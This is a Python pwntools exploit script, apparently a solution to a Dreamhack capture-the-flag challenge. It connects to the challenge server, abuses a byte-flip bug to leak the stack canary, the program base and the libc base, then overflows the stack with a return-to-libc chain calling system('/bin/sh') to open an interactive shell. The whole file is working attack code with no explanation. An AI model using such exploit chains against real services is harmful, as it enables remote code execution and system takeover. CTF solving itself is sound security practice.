from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 10015
r = remote(HOST, PORT)

def flip(val, idx, cont):
    r.sendafter(b'? ', val)
    r.sendlineafter(b') ', b'%d'%idx)
    r.sendlineafter(b'? ', cont)

for i in range(3):
    flip(b'AAAA', 0x56+i, b'n')

r.sendafter(b'? ', b'A'*0x50)
r.sendlineafter(b') ', b'%d'%0x50)
r.recv(0x57+8)
canary = u64(r.recv(8)[1:].ljust(8,b'\x00')) << 8
name = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x70

r.sendlineafter(b'? ', b'n')

for i in range(2):
    flip(b'A'*0x50, 0x66+i, b'n')

r.sendlineafter(b'? ', b'A'*0x50)
r.sendlineafter(b') ', b'%d'%0x50)
pie = u64(r.recvline().strip()[-6:].ljust(8,b'\x00')) - 0x1345
sz = pie + 0x4010

for i in range(2):
    flip(b'A'*0x50, 0x6e+i, b'n')

for i in range(8):
    flip(b'A'*0x50, 0x70+i, b'n')

r.sendafter(b'? ', b'A'*0x50)
r.sendlineafter(b') ', b'%d'%0x50)
libc = u64(r.recvline().strip()[-6:].ljust(8,b'\x00')) - 0x29d90
system = libc + 0x50d70
binsh = libc + 0x1d8698
pop_rdi = libc + 0x2a3e5
ret = libc + 0x29139

r.sendlineafter(b'? ', b'n')

flip(b'A'*0x50, sz-name, b'n')

payload = b'A'*0x58 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
flip(payload, 0, b'y')

r.interactive()